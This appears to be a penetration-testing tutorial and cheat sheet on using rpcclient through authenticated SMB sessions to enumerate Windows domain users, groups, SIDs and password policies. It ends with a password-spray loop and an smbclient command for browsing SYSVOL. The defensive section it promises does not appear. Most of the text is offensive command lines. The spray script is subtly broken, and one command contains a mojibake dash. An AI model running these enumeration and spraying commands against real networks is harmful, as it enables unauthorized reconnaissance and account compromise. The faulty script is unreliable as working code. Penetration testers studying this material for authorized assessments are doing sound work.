Some pen testers I've met think that because NULL sessions are increasingly extinct, stuff like rpcclient isn't useful. But, hey? as long as you have just one user name and its associated password (local or domain) for the target environment, you can make AUTHENTICATED SMB sessions (non-NULL). Even if your user and password are NOT in the admin group or domain admin group, you can still get a HUGE amount of information via an authenticated, non-admin SMB session to a target machine in the environment, plundering all kinds of stuff, including user names, group memberships, Security Identifiers (SIDs), and even last logon events. I'd like to show you how, as well as how a defender can squelch incoming SMB sessions in real-time on a Windows box.

Once you have a user name and password and open SMB access of a target Windows client or server over TCP port 445, you can use rpcclient to open an authenticated SMB session to a target machine by running the following command on your Linux system (rpcclient is built into many Linux distros by default):

$ rpcclient â€”U <username> <WinIPaddr>

If you had used a NULL Session, you would have entered a username of "". But, instead, use a real user name (which doesn't have to be in the admin group). When prompted for the password, enter it, and you'll see the funky rpcclient prompt (I say it is funky, because of it's $> notation):

rpcclient $>

(I have seen, on rare occasions, rpcclient refuse to connect unless it has the name of the target Windows machine inside of /etc/hosts. If it doesn't work, simply append into /etc/hosts a line that has the IP address of the target Windows machine and the hostname of that machine.)



$ rpcclient -U <username> <WinIPaddr>			Linux: connect to share
$ rpcclient -U "" -N <IP>						      Linux: connect via anonymous/NULL

rpcclient $> srvinfo							        Get hostname information. Refer to here.
rpcclient $> enumdomusers						      Get usernames and RIDs
rpcclient $> enumalsgroups domain			  	Enumerate domain groups
rpcclient $> enumalsgroups builtin				Enumerate builtin groups
rpcclient $> queryuser <RID>					    Query detailed user information based on RID
rpcclient $> querygroup <RID>					    Query groups based on RID ,If querygroup doesn't work, try queryaliasmem
rpcclient $> queryaliasmem <groupName> <RID>	Query groups, get user SIDs
rpcclient $> querygroupmem <RID>				  Query users' group membership

rpcclient $> getdompwinfo					      	Query for password complexity settings
rpcclient $> getusrdompwinfo 0x44f (rid)	Query users password properties

rpcclient $> lsaenumsid						Query for all SID numbers
rpcclient $> lookupsids <SID>					Reverse query SIDS for account names
NT_STATUS_NONE_MAPPED is returned if no account is linked to the queried SID
rpcclient $> lookupnames <username>			Query username for SID

Script for password spray over rpcclient
# for u in 'cat domain-users.txt'; do \ 
  echo -n "[*] user: $u" && \ 
  rpcclient -U "$u%<PASSWORD>" \
    -c "getusername;quit" <IP> \
done

Use smbclient and creds to gather SYSVOL information
$ smbclient -U "<username>%<password>" \\\\domain.corp\\SYSVOL
smb: \> ls
